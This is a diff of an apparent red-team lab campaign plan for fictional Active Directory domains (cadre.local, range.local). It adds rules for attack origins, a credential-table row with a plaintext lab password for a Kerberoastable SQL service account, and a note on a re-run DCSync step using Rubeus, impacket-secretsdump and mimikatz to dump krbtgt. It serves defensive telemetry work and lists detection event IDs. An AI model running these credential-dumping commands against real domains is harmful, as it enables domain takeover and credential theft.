@@ -19,7 +19,7 @@
 >
 > **RULE 1 — Direct SSH to ws01 only; provisioning is for lab configuration.** Every attack in this campaign runs from `ws01` via direct SSH only.
 > - **Attack origin:** `localhost → ws01` direct SSH (`analyst_t1` @ `192.168.77.62`) using `C:\Users\Ganro\.ssh\cadre-ws01-key`. No wrapper scripts, no provisioning bridge, no `ws01-exec.sh` / `ws01-stage-file.sh` indirection.
-> - **Provisioning (`.60`) and the `vagrant` account are config-only** — they are used to configure the lab, apply/verify playbooks, deploy config, and run Ansible; they are **never** an attack origin.
+> - **Provisioning (`.60`) and the `vagrant` account are config-only** — they are used to configure the lab, apply/verify playbooks, deploy config, and run Ansible; they are **never** an attack origin **and never the linux01 pivot**. Linux01 OS access is `cadre.local\mssql-linux01` (SSSD), not `vagrant` and not `analyst_t1` SSH.
 > - **Tool staging:** tools/scripts are copied `localhost → ws01` via `scp` with the ws01 key, then executed by SSH-ing into ws01.
 > - **Exception:** Rule 4’s H branch is the only case where provisioning hosts the initial-access delivery assets and `ws01` is the target.
 >
@@ -61,6 +61,7 @@
 | `root EA` | `cadre.local` | TGT | Phase 8 cross-forest | Phase 7 Golden Ticket + ExtraSids | `cadre_ea` | `creds.cadre_ea.ticket` |
 | `svc_sccm` | `range.local` | `s3rv1c3_SCCM!` | Branch C SCCM operations | Phase 8 cross-forest Kerberoast (WT033) | `svc_sccm` | `creds.svc_sccm.password` |
 | `svc_naa` | `range.local` | `N@A_s3rv1c3!` | range.local Domain Admin | Branch C NAA extraction (WT034) | `svc_naa` | `creds.svc_naa.password` |
+| `mssql-linux01` | `cadre.local` | `MS5QL_K3yt@b_P@ss!` | linux01 SSH (SSSD) + sudo root | Kerberoast SPN `MSSQLSvc/linux01.cadre.local:1433` (Rubeus on ws01; nxc RC4 roast `ETYPE_NOSUPP`) | `mssql-linux01` | `creds.mssql_linux01.password` |
 
 **Realistic Attack Principles**
 
@@ -768,7 +769,7 @@ We have `nt authority\system` on mbr01 via GodPotato. `analyst_cloud` has an act
 | **Command** | `Rubeus.exe ptt /ticket:<dc02$ TGT>` then `impacket-secretsdump 'child.cadre.local/dc02$@dc02.child.cadre.local' -k -no-pass` or `mimikatz # lsadump::dcsync /domain:child.cadre.local /user:krbtgt` |
 | **Key telemetry** | WinSec 4662 (DS Replication); Sysmon EID 3; Zeek dce_rpc.log (DRSUAPI); Suri SID:1000002 (63 fires) |
 | **Script** | `attack-matrix/04-automation/linux/campaign-a/T009-dcsync-ws01.sh` |
-| **Note** | ✅ VERIFIED 2026-07-31 — as-written path (T102 dc02$ TGT → secretsdump `-k` → child/krbtgt) verified. |
+| **Note** | ✅ VERIFIED 2026-07-31 — as-written path (T102 dc02$ TGT → secretsdump `-k` → child/krbtgt) verified. **Re-run 2026-08-22:** RedStrike `T009-dcsync-ws01.sh` ✅ (`T009_OK`, mimikatz as `chief_command` against `cadre.local` krbtgt). Kali `secretsdump` needs NetBIOS `CADRE/krbtgt` (duplicate-name error otherwise). This is the root-EA shortcut, not the T102 `dc02$` path. |
 
 ---
 
